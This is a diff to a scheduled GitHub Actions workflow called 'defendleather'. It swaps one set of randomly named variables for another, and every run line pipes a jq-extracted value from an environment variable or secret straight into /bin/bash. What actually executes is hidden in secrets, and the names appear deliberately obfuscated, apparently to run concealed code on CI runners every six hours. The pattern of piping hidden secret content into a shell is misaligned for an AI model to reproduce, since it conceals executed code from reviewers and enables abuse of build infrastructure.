@@ -1,9 +1,10 @@
 name: defendleather
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 0/6 * * *'
-jobs:  # 25669
+    - cron: '12 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,14 +12,17 @@ jobs:  # 25669
       - uses: actions/checkout@v4
       - name: defendleather
         env:
-          ohoqf5: ${{ secrets.ohoqf5 }}
+          y97321: ${{ secrets.y97321 }}
         run: |
-          echo $ohoqf5 | jq -r .abf7825 | /bin/bash
-          echo $nu0 | jq -r .pacu02593 | /bin/bash
-          echo $uu5848 | jq -r .msgl87 | /bin/bash
-          echo $uzo735 | jq -r .p2 | /bin/bash
-          echo $hvvxs7 | jq -r .n8 | /bin/bash
-          echo $lj0666 | jq -r .ay992 | /bin/bash
-          echo $l321 | jq -r .bjdqh55 | /bin/bash
-          echo $pzzpo3439 | jq -r .nnin43956 | /bin/bash
+          echo $y97321 | jq -r .xr00529 | /bin/bash
+          echo $lzgh87 | jq -r .q373 | /bin/bash
+          echo $vva5 | jq -r .tmihg545 | /bin/bash
+          echo $fw6895 | jq -r .fcsxd0 | /bin/bash
+          echo $aufk1751 | jq -r .pzbn43439 | /bin/bash
+          echo $b4431 | jq -r .zvxea68376 | /bin/bash
+          echo $qujbo212 | jq -r .ach633 | /bin/bash
+          echo $m8030 | jq -r .odai8161 | /bin/bash
+          echo $ji44 | jq -r .vt7176 | /bin/bash
+          echo $ivzme3313 | jq -r .rr5 | /bin/bash
+          echo $pcpo084 | jq -r .xc049 | /bin/bash
 
